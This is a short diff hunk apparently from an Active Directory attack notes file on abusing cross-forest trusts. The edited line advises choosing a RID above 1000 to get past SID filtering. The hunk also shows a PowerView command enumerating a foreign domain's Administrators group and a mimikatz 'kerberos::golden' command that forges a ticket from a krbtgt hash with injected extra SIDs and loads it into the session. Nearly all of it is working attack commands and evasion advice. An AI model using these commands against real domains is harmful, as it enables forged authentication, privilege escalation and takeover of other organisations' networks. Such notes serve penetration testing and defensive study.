@@ -1060,7 +1060,7 @@ We can then request a TGS for any service located within the External Forest hav
 
 
 
-Or find the RID via - ```Get-DomainGroupMember -Identity "Administrators" -Domain externalnet.com```
+Or find a high value RID >1000 to avoid SID filtering e.g., - ```Get-DomainGroupMember -Identity "Administrators" -Domain externalnet.com```
 
 ```
 kerberos::golden /user:adminz /domain:externalnet.com /sid:S-1-5-21-1095350385-1831131555-2412080359 /krbtgt:cd3fb1b0b49c7a56d285ffdbb1304431 /sids:S-1-5-21-4182647938-3943167060-1815963754-1106 /ptt
